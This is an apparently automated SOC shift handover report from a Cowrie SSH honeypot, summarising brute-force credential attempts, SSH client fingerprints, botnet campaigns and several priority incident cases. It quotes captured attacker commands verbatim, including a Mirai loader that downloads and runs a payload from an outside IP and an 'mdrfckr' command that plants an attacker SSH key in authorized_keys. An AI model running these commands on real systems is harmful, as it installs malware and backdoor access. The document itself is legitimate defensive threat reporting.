# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-05 |
| **Generated At** | 2026-09-05T13:21:03Z |
| **Shift Time** | 13:21 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **362** |
| Confirmed Threats | **326** |
| False Positives Filtered | **36** (9.9%) |
| Unique Attacker IPs | **87** |
| Countries of Origin | **31** |
| High Severity Cases | **154** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **208** |
| Malware Samples Analyzed | **4** HIGH · **20** MED · 19 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **203** |
| Unique Credential Pairs | **127** |
| Unique Usernames | **14** |
| Unique Passwords | **95** |
| Successful Auth Pairs | **164** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 119 |
| `admin` | 31 |
| `support` | 16 |
| `345gs5662d34` | 15 |
| `administrator` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 16 |
| `345gs5662d34` | 15 |
| `3245gs5662d34` | 14 |
| `1234` | 7 |
| `admin` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 16 |
| `345gs5662d34` | `345gs5662d34` | 15 |
| `root` | `3245gs5662d34` | 7 |
| `admin` | `` | 6 |
| `root` | `admin` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `12345` | `193.32.162.84` | 2026-09-05T06:57:16 |
| `root` | `Admin@2024` | `217.60.255.130` | 2026-09-05T06:57:45 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `172.236.228.38` | 2026-09-05T06:59:13 |
| `postgres` | `asdf1234` | `31.77.192.7` | 2026-09-05T06:59:36 |
| `345gs5662d34` | `345gs5662d34` | `31.77.192.7` | 2026-09-05T06:59:38 |
| `postgres` | `3245gs5662d34` | `31.77.192.7` | 2026-09-05T06:59:39 |
| `support` | `support` | `10.0.0.73` | 2026-09-05T07:01:02 |
| `root` | `12345678` | `193.32.162.84` | 2026-09-05T07:01:48 |
| `root` | `123456789` | `193.32.162.84` | 2026-09-05T07:04:06 |
| `a` | `1234` | `10.0.0.73` | 2026-09-05T07:05:14 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-05T07:05:18 |
| `a` | `3245gs5662d34` | `10.0.0.73` | 2026-09-05T07:05:20 |
| `root` | `P@ssw0rd` | `193.32.162.84` | 2026-09-05T07:06:24 |
| `root` | `Password1` | `193.32.162.84` | 2026-09-05T07:08:42 |
| `root` | `qwe@1234` | `217.60.255.130` | 2026-09-05T07:08:50 |
| `root` | `Root123` | `193.32.162.84` | 2026-09-05T07:11:01 |
| `root` | `1234567890qwe` | `10.0.0.73` | 2026-09-05T07:11:13 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-05T07:11:18 |
| `root` | `admin` | `193.32.162.84` | 2026-09-05T07:13:27 |
| `root` | `admin123` | `193.32.162.84` | 2026-09-05T07:15:47 |
| `root` | `alpine` | `193.32.162.84` | 2026-09-05T07:18:06 |
| `root` | `P@ssw0rd@123!` | `217.60.255.130` | 2026-09-05T07:19:54 |
| `root` | `changeme` | `193.32.162.84` | 2026-09-05T07:20:23 |
| `root` | `default` | `193.32.162.84` | 2026-09-05T07:22:36 |
| `support` | `support` | `77.90.185.17` | 2026-09-05T07:23:41 |
| `root` | `letmein` | `193.32.162.84` | 2026-09-05T07:24:46 |
| `root` | `passw0rd` | `193.32.162.84` | 2026-09-05T07:27:00 |
| `root` | `password` | `193.32.162.84` | 2026-09-05T07:29:15 |
| `root` | `.....` | `217.60.255.130` | 2026-09-05T07:30:54 |
| `root` | `qwerty` | `193.32.162.84` | 2026-09-05T07:31:32 |
| `root` | `r00t` | `193.32.162.84` | 2026-09-05T07:33:48 |
| `root` | `root123` | `193.32.162.84` | 2026-09-05T07:38:23 |
| `root` | `root@123` | `193.32.162.84` | 2026-09-05T07:40:35 |
| `root` | `Admin1!` | `217.60.255.130` | 2026-09-05T07:41:56 |
| `support` | `support` | `176.53.159.196` | 2026-09-05T07:42:02 |
| `root` | `racine` | `46.225.62.66` | 2026-09-05T07:42:47 |
| `root` | `rootme` | `193.32.162.84` | 2026-09-05T07:42:49 |
| `345gs5662d34` | `345gs5662d34` | `46.225.62.66` | 2026-09-05T07:42:50 |
| `root` | `3245gs5662d34` | `46.225.62.66` | 2026-09-05T07:42:51 |
| `root` | `system` | `193.32.162.84` | 2026-09-05T07:45:07 |
| `root` | `toor` | `193.32.162.84` | 2026-09-05T07:47:24 |
| `admin` | `admin2023` | `118.193.33.216` | 2026-09-05T07:49:02 |
| `345gs5662d34` | `345gs5662d34` | `118.193.33.216` | 2026-09-05T07:49:06 |
| `admin` | `3245gs5662d34` | `118.193.33.216` | 2026-09-05T07:49:07 |
| `root` | `welcome` | `193.32.162.84` | 2026-09-05T07:50:03 |
| `admin` | `111111` | `193.32.162.84` | 2026-09-05T07:52:26 |
| `root` | `P@ssw0rd!@#` | `217.60.255.130` | 2026-09-05T07:52:55 |
| `admin` | `123123` | `193.32.162.84` | 2026-09-05T07:54:45 |
| `root` | `admin` | `16.5.0.236` | 2026-09-05T07:56:38 |
| `admin` | `1234` | `193.32.162.84` | 2026-09-05T07:57:03 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-09-05T07:59:17 |
| `root` | `123@@@` | `64.110.90.250` | 2026-09-05T07:59:17 |
| `admin` | `12345` | `193.32.162.84` | 2026-09-05T07:59:21 |
| `root` | `123!@#qwe` | `223.233.86.187` | 2026-09-05T07:59:26 |
| `345gs5662d34` | `345gs5662d34` | `223.233.86.187` | 2026-09-05T07:59:30 |
| `root` | `3245gs5662d34` | `223.233.86.187` | 2026-09-05T07:59:32 |
| `admin` | `123456` | `193.32.162.84` | 2026-09-05T08:01:35 |
| `root` | `Hm123456` | `182.48.80.240` | 2026-09-05T08:03:15 |
| `345gs5662d34` | `345gs5662d34` | `182.48.80.240` | 2026-09-05T08:03:20 |
| `root` | `3245gs5662d34` | `182.48.80.240` | 2026-09-05T08:03:22 |
| `admin` | `12345678` | `193.32.162.84` | 2026-09-05T08:03:40 |
| `root` | `Admin22` | `217.60.255.130` | 2026-09-05T08:03:58 |
| `admin` | `123456789` | `193.32.162.84` | 2026-09-05T08:05:44 |
| `admin` | `Admin123` | `193.32.162.84` | 2026-09-05T08:07:51 |
| `admin` | `Administrator` | `193.32.162.84` | 2026-09-05T08:09:55 |
| `admin` | `P@ssw0rd` | `193.32.162.84` | 2026-09-05T08:12:02 |
| `admin` | `access` | `193.32.162.84` | 2026-09-05T08:14:08 |
| `root` | `Temp@321` | `217.60.255.130` | 2026-09-05T08:15:01 |
| `admin` | `admin` | `193.32.162.84` | 2026-09-05T08:16:14 |
| `admin` | `admin123` | `193.32.162.84` | 2026-09-05T08:18:18 |
| `admin` | `admin@123` | `193.32.162.84` | 2026-09-05T08:20:29 |
| `admin` | `adminadmin` | `193.32.162.84` | 2026-09-05T08:22:37 |
| `admin` | `letmein` | `193.32.162.84` | 2026-09-05T08:24:41 |
| `root` | `Spectrum@123` | `217.60.255.130` | 2026-09-05T08:26:02 |
| `admin` | `passw0rd` | `193.32.162.84` | 2026-09-05T08:26:50 |
| `admin` | `password` | `193.32.162.84` | 2026-09-05T08:28:54 |
| `admin` | `password1` | `193.32.162.84` | 2026-09-05T08:31:01 |
| `admin` | `qwerty` | `193.32.162.84` | 2026-09-05T08:33:13 |
| `administrator` | `123456` | `193.32.162.84` | 2026-09-05T08:35:30 |
| `root` | `1001chin` | `95.154.84.123` | 2026-09-05T08:36:04 |
| `root` | `Admin_123` | `217.60.255.130` | 2026-09-05T08:37:06 |
| `administrator` | `P@ssw0rd` | `193.32.162.84` | 2026-09-05T08:37:51 |
| `administrator` | `admin` | `193.32.162.84` | 2026-09-05T08:40:18 |
| `administrator` | `administrator` | `193.32.162.84` | 2026-09-05T08:42:53 |
| `administrator` | `password` | `193.32.162.84` | 2026-09-05T08:44:43 |
| `administrator` | `root` | `193.32.162.84` | 2026-09-05T08:46:38 |
| `root` | `Samsung12` | `217.60.255.130` | 2026-09-05T08:48:08 |
| `apache` | `1234` | `193.32.162.84` | 2026-09-05T08:48:39 |
| `root` | `Administrator12345` | `217.60.255.130` | 2026-09-05T08:59:11 |
| `root` | `admin@123456` | `217.60.255.130` | 2026-09-05T09:10:19 |
| `root` | `1234567890` | `195.178.110.228` | 2026-09-05T09:13:58 |
| `root` | `password1` | `195.178.110.228` | 2026-09-05T09:15:20 |
| `root` | `admin123` | `195.178.110.228` | 2026-09-05T09:16:45 |
| `ubuntu` | `Aa000000` | `10.0.0.73` | 2026-09-05T09:17:05 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-09-05T09:17:11 |
| `sbot` | `sbot` | `10.0.0.73` | 2026-09-05T09:17:53 |
| `sbot` | `3245gs5662d34` | `10.0.0.73` | 2026-09-05T09:17:58 |
| `root` | `1234` | `195.178.110.228` | 2026-09-05T09:18:10 |
| `root` | `Password999` | `10.0.0.73` | 2026-09-05T09:18:33 |
| `root` | `123` | `195.178.110.228` | 2026-09-05T09:19:38 |
| `root` | `qwerty123` | `195.178.110.228` | 2026-09-05T09:21:06 |
| `root` | `Admin@2022` | `217.60.255.130` | 2026-09-05T09:21:30 |
| `root` | `1q2w3e4r` | `195.178.110.228` | 2026-09-05T09:22:27 |
| `root` | `pass123` | `195.178.110.228` | 2026-09-05T09:23:40 |
| `root` | `123abc` | `195.178.110.228` | 2026-09-05T09:24:56 |
| `admin` | `1234567890` | `195.178.110.228` | 2026-09-05T09:26:13 |
| `admin` | `password1` | `195.178.110.228` | 2026-09-05T09:27:26 |
| `admin` | `admin123` | `195.178.110.228` | 2026-09-05T09:28:42 |
| `root` | `Admin55` | `217.60.255.130` | 2026-09-05T09:32:37 |
| `root` | `TESTDUPS` | `10.0.0.73` | 2026-09-05T09:38:24 |
| `root` | `zlxx.` | `80.83.26.69` | 2026-09-05T09:42:49 |
| `root` | `www.123.com` | `217.60.255.130` | 2026-09-05T09:43:46 |
| `root` | `Server` | `10.0.0.73` | 2026-09-05T10:22:21 |
| `root` | `yang@123` | `10.0.0.73` | 2026-09-05T10:22:48 |
| `jesus` | `1234` | `10.0.0.73` | 2026-09-05T10:23:15 |
| `clara` | `clara` | `10.0.0.73` | 2026-09-05T10:23:43 |
| `clara` | `3245gs5662d34` | `10.0.0.73` | 2026-09-05T10:23:44 |
| `root` | `!qazxsw23edc` | `217.60.255.130` | 2026-09-05T10:29:08 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-09-05T10:54:23 |
| `root` | `000000` | `92.118.39.71` | 2026-09-05T10:59:22 |
| `root` | `111111` | `92.118.39.71` | 2026-09-05T11:01:49 |
| `root` | `admin` | `220.85.210.200` | 2026-09-05T11:02:40 |
| `root` | `123` | `92.118.39.71` | 2026-09-05T11:04:11 |
| `root` | `123123` | `92.118.39.71` | 2026-09-05T11:06:28 |
| `root` | `123321` | `92.118.39.71` | 2026-09-05T11:08:33 |
| `root` | `1234` | `92.118.39.71` | 2026-09-05T11:10:39 |
| `root` | `12345` | `92.118.39.71` | 2026-09-05T11:12:46 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `64.62.156.108` | 2026-09-05T11:13:08 |
| `root` | `1234567` | `92.118.39.71` | 2026-09-05T11:16:40 |
| `root` | `12345678` | `92.118.39.71` | 2026-09-05T11:18:44 |
| `root` | `123456789` | `92.118.39.71` | 2026-09-05T11:20:43 |
| `root` | `1234567890` | `92.118.39.71` | 2026-09-05T11:22:36 |
| `root` | `2wsx1qaz` | `217.60.255.130` | 2026-09-05T11:23:54 |
| `root` | `123456a` | `92.118.39.71` | 2026-09-05T11:24:26 |
| `root` | `123456b` | `92.118.39.71` | 2026-09-05T11:26:23 |
| `root` | `123abc` | `92.118.39.71` | 2026-09-05T11:28:15 |
| `root` | `﻿------fuck------` | `104.168.94.22` | 2026-09-05T11:28:44 |
| `root` | `123qwe` | `92.118.39.71` | 2026-09-05T11:30:06 |
| `root` | `1q2w3e4r` | `92.118.39.71` | 2026-09-05T11:31:53 |
| `root` | `555555` | `92.118.39.71` | 2026-09-05T11:33:39 |
| `root` | `654321` | `92.118.39.71` | 2026-09-05T11:35:25 |
| `root` | `7777777` | `92.118.39.71` | 2026-09-05T11:37:27 |
| `root` | `abc123` | `92.118.39.71` | 2026-09-05T11:39:30 |
| `root` | `admin` | `92.118.39.71` | 2026-09-05T11:41:33 |
| `root` | `admin123` | `92.118.39.71` | 2026-09-05T11:43:47 |
| `root` | `passw0rd` | `92.118.39.71` | 2026-09-05T11:45:53 |
| `root` | `password` | `92.118.39.71` | 2026-09-05T11:47:50 |
| `root` | `password1` | `92.118.39.71` | 2026-09-05T11:50:02 |
| `root` | `` | `209.99.186.128` | 2026-09-05T11:58:17 |
| `root` | `asdasd` | `77.90.185.20` | 2026-09-05T12:03:04 |
| `root` | `111111` | `195.178.110.232` | 2026-09-05T12:11:32 |
| `root` | `123123` | `195.178.110.232` | 2026-09-05T12:13:37 |
| `root` | `1234` | `195.178.110.232` | 2026-09-05T12:15:39 |
| `root` | `12345` | `195.178.110.232` | 2026-09-05T12:17:40 |
| `root` | `Qwe123!@#` | `217.60.255.130` | 2026-09-05T12:20:13 |
| `root` | `12345678` | `195.178.110.232` | 2026-09-05T12:22:00 |
| `root` | `123456789` | `195.178.110.232` | 2026-09-05T12:24:13 |
| `root` | `Password1` | `195.178.110.232` | 2026-09-05T12:26:26 |
| `root` | `admin` | `195.178.110.232` | 2026-09-05T12:28:39 |
| `root` | `admin123` | `195.178.110.232` | 2026-09-05T12:30:41 |
| `root` | `default` | `195.178.110.232` | 2026-09-05T12:32:29 |
| `root` | `letmein` | `195.178.110.232` | 2026-09-05T12:34:22 |
| `planka` | `planka` | `10.0.0.73` | 2026-09-05T12:40:50 |
| `planka` | `3245gs5662d34` | `10.0.0.73` | 2026-09-05T12:40:53 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **362** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 116 |
| libssh | 35 |
| OpenSSH | 9 |
| Paramiko (Python) | 4 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 101 | 4 |
| `419da4c91ddb...` | Modern SSH client | 19 | 1 |
| `f555226df196...` | Mirai/variant | 15 | 5 |
| `eff4c24daffc...` | Modern SSH client | 5 | 1 |
| `390ffe68a68c...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 101 | 4 | Mirai/variant |
| `419da4c91ddb...` | libssh | 19 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 15 | 5 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 5 | 1 | Modern SSH client |
| `390ffe68a68c...` | OpenSSH | 4 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 3 | 3 | — |
| `dd9bcf093c35...` | Unknown | 3 | 3 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **6** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Recon Loader Script** | 🟡 MEDIUM | 97 | 4 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 2 | `T1105, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `16.5.0.236`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`, `193.32.162.84`, `195.178.110.232`, `92.118.39.71`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
/bin/busybox TOKEN
```
Source IPs: `80.83.26.69`, `95.154.84.123`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **87** |
| Unique ASNs | **48** |
| High-Risk ASNs | **29** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 27 | HIGH |
| `AS25369` | Hydra Communications Ltd | 6 | HIGH |
| `AS396982` | Google LLC | 4 | LOW |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | LOW |
| `AS22927` | Telefonica de Argentina | 2 | LOW |
| `AS9198` | JSC Kazakhtelecom | 1 | HIGH |
| `AS271097` | TELGE SERVIÇOS DE TELECOMUNICAÇÕES LTDA | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (154)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f5eb9080623b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 06:57 |
| **Last Seen** | 2026-09-05 06:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 06:57:13` | `cowrie.session.connect` |
| `2026-09-05 06:57:13` | `cowrie.client.version` |
| `2026-09-05 06:57:14` | `cowrie.client.kex` |
| `2026-09-05 06:57:16` | `cowrie.login.success` |
| `2026-09-05 06:57:18` | `cowrie.session.params` |
| `2026-09-05 06:57:18` | `cowrie.command.input` |
| `2026-09-05 06:57:18` | `cowrie.command.input` |
| `2026-09-05 06:57:18` | `cowrie.command.input` |
| `2026-09-05 06:57:18` | `cowrie.command.input` |
| `2026-09-05 06:57:18` | `cowrie.command.input` |
| `2026-09-05 06:57:18` | `cowrie.command.success` |
| `2026-09-05 06:57:18` | `cowrie.command.input` |
| `2026-09-05 06:57:18` | `cowrie.command.input` |
| `2026-09-05 06:57:18` | `cowrie.command.input` |
| `2026-09-05 06:57:18` | `cowrie.command.input` |
| `2026-09-05 06:57:18` | `cowrie.log.closed` |
| `2026-09-05 06:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76f85ac4c1d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 06:57 |
| **Last Seen** | 2026-09-05 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 06:57:44` | `cowrie.session.connect` |
| `2026-09-05 06:57:44` | `cowrie.client.version` |
| `2026-09-05 06:57:45` | `cowrie.client.kex` |
| `2026-09-05 06:57:45` | `cowrie.login.success` |
| `2026-09-05 06:57:46` | `cowrie.direct-tcpip.request` |
| `2026-09-05 06:57:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 06:57:46` | `cowrie.direct-tcpip.data` |
| `2026-09-05 06:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43064ddb77c6

| Field | Detail |
|---|---|
| **Source IP** | `172.236.228[.]38` |
| **First Seen** | 2026-09-05 06:59 |
| **Last Seen** | 2026-09-05 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 06:59:13` | `cowrie.session.connect` |
| `2026-09-05 06:59:13` | `cowrie.login.success` |
| `2026-09-05 06:59:14` | `cowrie.session.params` |
| `2026-09-05 06:59:14` | `cowrie.command.input` |
| `2026-09-05 06:59:14` | `cowrie.command.input` |
| `2026-09-05 06:59:14` | `cowrie.command.failed` |
| `2026-09-05 06:59:14` | `cowrie.command.input` |
| `2026-09-05 06:59:14` | `cowrie.command.failed` |
| `2026-09-05 06:59:14` | `cowrie.command.input` |
| `2026-09-05 06:59:14` | `cowrie.log.closed` |
| `2026-09-05 06:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.228[.]38` to AbuseIPDB if not already reported
- [ ] Block `172.236.228[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11ed29e23bd3

| Field | Detail |
|---|---|
| **Source IP** | `31.77.192[.]7` |
| **First Seen** | 2026-09-05 06:59 |
| **Last Seen** | 2026-09-05 06:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 06:59:35` | `cowrie.session.connect` |
| `2026-09-05 06:59:35` | `cowrie.client.version` |
| `2026-09-05 06:59:35` | `cowrie.client.kex` |
| `2026-09-05 06:59:36` | `cowrie.login.success` |
| `2026-09-05 06:59:36` | `cowrie.session.params` |
| `2026-09-05 06:59:36` | `cowrie.command.input` |
| `2026-09-05 06:59:36` | `cowrie.command.failed` |
| `2026-09-05 06:59:36` | `cowrie.log.closed` |
| `2026-09-05 06:59:37` | `cowrie.session.params` |
| `2026-09-05 06:59:37` | `cowrie.command.input` |
| `2026-09-05 06:59:37` | `cowrie.session.file_download` |
| `2026-09-05 06:59:37` | `cowrie.log.closed` |
| `2026-09-05 06:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.77.192[.]7` to AbuseIPDB if not already reported
- [ ] Block `31.77.192[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cac566d31c7

| Field | Detail |
|---|---|
| **Source IP** | `31.77.192[.]7` |
| **First Seen** | 2026-09-05 06:59 |
| **Last Seen** | 2026-09-05 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 06:59:37` | `cowrie.session.connect` |
| `2026-09-05 06:59:37` | `cowrie.client.version` |
| `2026-09-05 06:59:38` | `cowrie.client.kex` |
| `2026-09-05 06:59:38` | `cowrie.login.success` |
| `2026-09-05 06:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.77.192[.]7` to AbuseIPDB if not already reported
- [ ] Block `31.77.192[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dfe2c6aa504

| Field | Detail |
|---|---|
| **Source IP** | `31.77.192[.]7` |
| **First Seen** | 2026-09-05 06:59 |
| **Last Seen** | 2026-09-05 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 06:59:38` | `cowrie.session.connect` |
| `2026-09-05 06:59:38` | `cowrie.client.version` |
| `2026-09-05 06:59:38` | `cowrie.client.kex` |
| `2026-09-05 06:59:39` | `cowrie.login.success` |
| `2026-09-05 06:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.77.192[.]7` to AbuseIPDB if not already reported
- [ ] Block `31.77.192[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a676e10c78a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:01 |
| **Last Seen** | 2026-09-05 07:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
